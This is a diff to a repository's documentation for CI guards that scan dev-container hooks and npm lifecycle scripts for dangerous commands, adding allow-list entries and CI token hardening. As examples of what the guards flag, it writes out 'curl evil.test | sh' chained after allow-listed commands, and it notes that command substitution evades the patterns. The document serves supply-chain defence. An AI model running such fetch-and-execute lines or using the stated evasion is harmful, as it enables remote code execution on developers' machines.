@@ -123,22 +123,36 @@ Flags:
   (root alone is not flagged — a root-only devcontainer passes)
 
 Explicitly allowed without error (documented allow-list, fixture-locked):
-`npm ci`, `yarn install`, `pnpm install`, `cargo build/check/fmt/clippy/test`,
-`rustup component add`, `sudo apt-get update/install`. Any other hook command
-is reported for human review rather than silently allowed.
+`npm ci`, `yarn install`, `pnpm install`, `bun install`, `pip install`,
+`cargo build/check/fmt/clippy/test`, `rustup component add`,
+`apt-get update/install`, `sudo apt-get update/install`.
+
+The allow-list **does not short-circuit the danger checks**: every hook is
+scanned for the patterns below regardless of whether its first command is
+allow-listed, so `npm ci && curl evil.test | sh` is flagged. The allow-list
+only suppresses the "unfamiliar command" noise for known-good single
+commands.
+
+Hook value forms accepted per the devcontainer spec: **string**, **array**
+(each element scanned individually), and **object** with a `"command"` key
+(string or array).
 
 ### Known false positives
 
-Any auto-run hook not on the allow-list is reported even if benign (for
-example `make setup`). The remedy is a narrowly-scoped allow-list entry with a
-fixture, not a widened rule.
+None known for the documented allow-list. A genuinely novel but benign
+bootstrap command is *not* flagged by default — only the danger patterns
+below cause failure, so unfamiliar-but-safe commands pass silently. The
+remedy for a false positive is to narrow the danger pattern, not to widen
+an allow-list.
 
 ### Limitations
 
 * Does not inspect `Dockerfile` instructions (`RUN`, `ENTRYPOINT`) referenced
   by the dev container image build.
-* Commands are matched by pattern, not interpreted; a hook that obfuscates its
-  intent behind an allow-listed prefix will pass.
+* Commands are matched by pattern, not interpreted; an obfuscated payload
+  that avoids every pattern below will pass. The patterns are chosen to
+  cover the shapes used in the incident and their common variants, not to
+  be exhaustive.
 * Does not cover user-level dev-container overrides or extension-contributed
   tasks.
 
@@ -166,20 +180,29 @@ Flags hooks that:
 
 Explicitly allowed without error (documented, fixture-locked): `husky
 install`, `pinst enable/disable`, `patch-package`, `npm run <script>`,
-`yarn/pnpm run`, `node-gyp`, `tsc`, `lerna run`, `corepack`, plain `echo` /
-`exit 0` / `true`. Any non-listed hook command is reported for human review.
+`yarn/pnpm run`, `node-gyp`, `tsc`, `lerna run`, `corepack`, `node
+./scripts/<file>.js`, plain `echo` / `exit 0` / `true`.
+
+The allow-list **does not short-circuit the danger checks**: every lifecycle
+hook is scanned for the patterns below regardless of whether it starts with
+an allow-listed command, so `husky install && curl evil.test | sh` is
+flagged. The allow-list only suppresses noise for known-good single
+commands.
 
 ### Known false positives
 
-A lifecycle hook calling an unusual but legitimate tool (for example
-`simple-git-hooks`) is reported rather than silently passed. Remedy: add a
-narrow allow-list entry with a fixture proving the safe case.
+None known for the documented allow-list. Unfamiliar-but-benign commands
+(for example `simple-git-hooks`) are *not* flagged by default — only the
+danger patterns below cause failure. The remedy for a false positive is to
+narrow a danger pattern, not to widen an allow-list.
 
 ### Limitations
 
 * Does not cover `.npmrc`, `.yarnrc`, lockfile injection, or
   `prepack`/`postpack` (pack-time, not install-time).
-* Pattern-based; not a semantic shell interpreter.
+* Pattern-based; not a semantic shell interpreter. An obfuscated payload
+  that avoids every pattern below will pass (for example a payload built
+  via shell command substitution rather than `eval(`).
 
 ## Tests
 
@@ -213,3 +236,8 @@ Guards C and D are **preventive**: this repository has no `.devcontainer/`
 and no `package.json`, so they inspect zero files today. They are documented as
 fixture-verified controls rather than live controls; neither claims to have
 caught anything in this repository.
+
+CI hardening added with these guards: workflow-level `permissions:
+contents: read` (default read-only for all jobs) and
+`persist-credentials: false` on every `actions/checkout` step, so a
+compromised step or fork PR cannot exfiltrate or persist `GITHUB_TOKEN`.
